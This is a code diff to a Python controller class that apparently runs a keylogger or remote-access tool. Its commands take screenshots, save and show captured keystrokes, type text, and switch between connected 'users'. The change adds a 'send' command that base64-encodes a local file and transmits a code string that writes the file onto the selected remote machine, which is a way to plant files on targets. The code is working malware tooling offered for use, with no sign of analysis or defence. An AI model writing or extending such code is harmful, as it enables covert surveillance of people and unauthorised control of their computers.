@@ -1,7 +1,7 @@
 from PIL import Image
 from pyperclip import copy
+from terminal.conn import *
 from terminal.help import info
-from terminal.functions import *
 import base64
 import io
 import keyboard
@@ -44,8 +44,9 @@ class Terminal(object):
             "print": lambda args: self.print_screen(),
             "save": lambda args: self.save_keys(),
             "select": lambda user: self.change_user(user),
+            "send": lambda filename: self.send_file(filename),
             "stop": lambda args: self.change_status(False),
-            "user": lambda args: print("", self.__username),
+            "user": lambda args: print(" " + self.__username),
             "users": lambda args: self.show_users(),
             "write": lambda text: self.write(text)
             }
@@ -250,6 +251,30 @@ class Terminal(object):
 
         # Retorna a resposta obtida.
         return output
+
+
+    def send_file(self, filename):
+
+        """
+        Envia um arquivo.
+        """
+
+        if not self.hasUser(): return
+
+        # Verifica se o arquivo existe.
+        if not os.path.exists(filename): 
+            print(" This file does not exist")
+            return
+
+        with open(filename, "rb") as file:
+            data = file.read()
+
+        data = base64.b64encode(data).decode()
+        filename = os.path.split(filename)[-1]
+
+        # Envia os dados.
+        output = self.send('#self.create_file(r"{}","{}");'.format(filename, data))
+        print(" " + output)
 
 
     def show_keys(self):
